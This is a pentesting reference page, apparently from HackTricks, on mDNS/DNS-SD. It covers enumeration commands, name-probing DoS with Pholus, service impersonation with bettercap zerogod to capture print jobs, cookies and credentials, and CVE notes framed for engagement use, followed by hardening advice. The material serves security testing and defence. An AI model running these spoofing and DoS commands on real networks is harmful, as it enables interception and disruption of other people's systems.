# 5353/UDP Multicast DNS (mDNS) and DNS-SD

{{#include ../banners/hacktricks-training.md}}

## 基本情報

Multicast DNS (mDNS) は、unicast DNS server を必要とせずにローカルリンク内で DNS のような名前解決とサービス検出を可能にします。UDP/5353 とマルチキャストアドレス 224.0.0.251 (IPv4) および FF02::FB (IPv6) を使用します。DNS Service Discovery (DNS-SD, typically used with mDNS) は PTR、SRV、TXT レコードを介してサービスを列挙・記述するための標準化された方法を提供します。
```
PORT     STATE SERVICE
5353/udp open  zeroconf
```
Key protocol details you’ll often leverage during attacks:
- .local ゾーンの名前は mDNS によって解決されます。
- QU (Query Unicast) ビットは、マルチキャストのクエリに対してもユニキャスト応答を要求する場合があります。
- 実装はローカルリンク以外を送信元とするパケットを無視するべきですが、一部のスタックはまだそれらを受け入れます。
- プロービング／アナウンス時にホスト名／サービス名の一意性が保証されます。ここに干渉すると DoS や “name squatting” 状態を引き起こします。

## DNS-SD service model

サービスは .local 以下で _<service>._tcp または _<service>._udp として識別されます。例: _ipp._tcp.local (printers), _airplay._tcp.local (AirPlay), _adb._tcp.local (Android Debug Bridge), など。型は _services._dns-sd._udp.local で発見し、発見したインスタンスは SRV/TXT/A/AAAA に解決します。

## Network Exploration and Enumeration

- nmap target scan (direct mDNS on a host):
```bash
nmap -sU -p 5353 --script=dns-service-discovery <target>
```
- nmap broadcast discovery (listen to the segment and enumerate all DNS-SD types/instances):
```bash
sudo nmap --script=broadcast-dns-service-discovery
```
- avahi-browse (Linux):
```bash
# List service types
avahi-browse -bt _services._dns-sd._udp
# Browse all services and resolve to host/port
avahi-browse -art
```
- Apple dns-sd (macOS):
```bash
# Browse all HTTP services
dns-sd -B _http._tcp
# Enumerate service types
dns-sd -B _services._dns-sd._udp
# Resolve a specific instance to SRV/TXT
dns-sd -L "My Printer" _ipp._tcp local
```
- Packet capture with tshark:
```bash
# Live capture
sudo tshark -i <iface> -f "udp port 5353" -Y mdns
# Only DNS-SD service list queries
sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
```

Tip: 一部のブラウザ／WebRTC はローカル IP を隠すために一時的な mDNS ホスト名を使用します。ネットワーク上で random-UUID.local のような候補を見かけたら、mDNS で解決してローカル IP へピボットしてください。

## Attacks

### mDNS name probing interference (DoS / name squatting)

プロービング段階では、ホストが名前の一意性を確認します。偽の競合を返答すると、ホストは新しい名前を選ぶか登録に失敗します。これによりサービスの登録や検出が遅延したり阻止されたりします。

Example with Pholus:
```bash
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```
### サービスのスプーフィングとなりすまし (MitM)

広告されている DNS-SD サービス（プリンター、AirPlay、HTTP、ファイル共有）を偽装してクライアントをあなたに接続させる。特に以下で有用：
- _ipp._tcp または _printer._tcp を偽装してドキュメントを取得する。
- クライアントを HTTP/HTTPS サービスに誘導してトークン/クッキーを収集したり、ペイロードを配布する。
- Windows クライアントが偽装サービスに対して認証を交渉する際に、NTLM relay techniques と組み合わせる。

bettercap の zerogod モジュール（mDNS/DNS-SD spoofer/impersonator）を使用すると：
```bash
# Start mDNS/DNS-SD discovery
sudo bettercap -iface <iface> -eval "zerogod.discovery on"

# Show all services seen from a host
> zerogod.show 192.168.1.42
# Show full DNS records for a host (newer bettercap)
> zerogod.show-full 192.168.1.42

# Impersonate all services of a target host automatically
> zerogod.impersonate 192.168.1.42

# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42

# Replay previously captured services
> zerogod.save 192.168.1.42 target.yml
> zerogod.advertise target.yml
```
Also see generic LLMNR/NBNS/mDNS/WPAD spoofing and credential capture/relay workflows:

{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### 最近の実装問題に関する注意（エンゲージメント中のDoS/永続化で有用）

- Avahi の reachable-assertion と D-Bus クラッシュのバグ（2023）は Linux ディストリビューション上で avahi-daemon を終了させ、ターゲットホストのサービス探索を再起動まで妨げる可能性がある（例: CVE-2023-38469..38473, CVE-2023-1981）。
- Cisco IOS XE Wireless LAN Controller の mDNS gateway DoS (CVE-2024-20303) により、隣接する WLAN クライアントが細工した mDNS を大量送信して WLC の CPU スパイクや AP トンネルの切断を引き起こせる。クライアントのローミングやコントローラのリセットを強制したい場面で便利。
- Apple mDNSResponder のロジックエラーによる DoS (CVE-2024-44183) は、サンドボックス化されたローカルプロセスが Bonjour をクラッシュさせ、Apple エンドポイント上でサービスの公開/検索を一時的に抑制できる；現行の iOS/macOS リリースで修正済み。
- Apple mDNSResponder の整合性問題 (CVE-2025-31222) は、mDNSResponder を介したローカル権限昇格を可能にしていた；管理されていない Mac/iPhone 上での永続化に悪用できるが、最近の iOS/macOS 更新で修正済み。

### Browser/WebRTC の mDNS に関する考慮点

Modern Chromium/Firefox は host candidates をランダムな mDNS 名で難読化する。Chrome ポリシー `WebRtcLocalIpsAllowedUrls` を配布して（または `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns` / Edge の同等設定を切る）ICE が mDNS ではなく host candidates を露出するようにすれば、管理下のエンドポイントで LAN IP を再露出させることができる；`HKLM\Software\Policies\Google\Chrome` 経由で設定する。

ユーザが手動で保護を無効化すると（WebRTC トラブルシューティングガイドでよくある）、ブラウザは再び平文の host candidates を広告し始めるため、mDNS や ICE シグナリングを通じてキャプチャし、ホスト発見を高速化できる。

## 防御上の考慮点と OPSEC

- セグメント境界: mDNS のマルチキャストアドレス 224.0.0.251/FF02::FB をセキュリティゾーン間でルーティングしないこと。明示的に mDNS gateway が必要な場合を除く。探索をブリッジする必要がある場合は、許可リストとレート制限を優先する。
- Windows endpoints/servers:
- 名前解決を mDNS 経由で完全に無効化するには、レジストリ値を設定して再起動する:
```
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
```
- 管理下の環境では、組み込みの “mDNS (UDP-In)” Windows Defender Firewall ルール（少なくとも Domain プロファイル）を無効にして、ホーム/ローミング機能を維持しつつ着信 mDNS の処理を防ぐ。
- 新しい Windows 11 ビルド / GPO テンプレートでは、ポリシー “Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol” を Disabled に設定する。
- Linux (Avahi):
- 不要なときは公開をロックダウンする: `/etc/avahi/avahi-daemon.conf` で `disable-publishing=yes` を設定し、`allow-interfaces=` / `deny-interfaces=` でインターフェースを制限する。
- `check-response-ttl=yes` の検討や、`enable-reflector=yes` は必要な場合を除いて避けること；reflecting が必要なら `reflect-filters=` の許可リストを優先する。
- macOS: Bonjour discovery が特定のサブネットで不要な場合は、ホスト/ネットワークファイアウォールで着信 mDNS を制限する。
- 監視: `_services._dns-sd._udp.local` クエリの異常な急増や、重要なサービスの SRV/TXT の突然の変更をアラートすること；これらは spoofing やサービスなりすましの指標となる。

## Tooling quick reference

- nmap NSE: `dns-service-discovery` and `broadcast-dns-service-discovery`.
- Pholus: アクティブスキャン、逆 mDNS スイープ、DoS と spoofing の補助ツール。
```bash
# Passive sniff (timeout seconds)
sudo python3 pholus3.py <iface> -stimeout 60
# Enumerate service types
sudo python3 pholus3.py <iface> -sscan
# Send generic mDNS requests
sudo python3 pholus3.py <iface> --request
# Reverse mDNS sweep of a subnet
sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
```
- bettercap zerogod: discover, save, advertise, and impersonate mDNS/DNS-SD services (see examples above).

## Spoofing/MitM

このサービスを使って行える最も興味深い攻撃は、クライアントと実際のサーバ間の通信に対する MitM を行うことです。印刷機との通信を MitM して機密ファイルを取得したり、Windows authentication を含む資格情報を入手できる可能性があります。\
詳細については次を確認してください:


{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## References

- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://books.google.co.uk/books/about/Practical_IoT_Hacking.html?id=GbYEEAAAQBAJ&redir_esc=y)
- [Nmap NSE: broadcast-dns-service-discovery](https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html)
- [bettercap zerogod (mDNS/DNS-SD discovery, spoofing, impersonation)](https://www.bettercap.org/modules/ethernet/zerogod/)
- [Cisco IOS XE WLC mDNS gateway DoS (CVE-2024-20303) advisory](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-wlc-mdns-dos-4hv6pBGf.html)
- [Rapid7 advisory for Apple mDNSResponder CVE-2024-44183](https://www.rapid7.com/db/vulnerabilities/apple-mdnsresponder-cve-2024-44183/)
- [Rapid7 writeup of Apple mDNSResponder CVE-2025-31222](https://www.rapid7.com/db/vulnerabilities/apple-osx-mdnsresponder-cve-2025-31222/)

{{#include ../banners/hacktricks-training.md}}
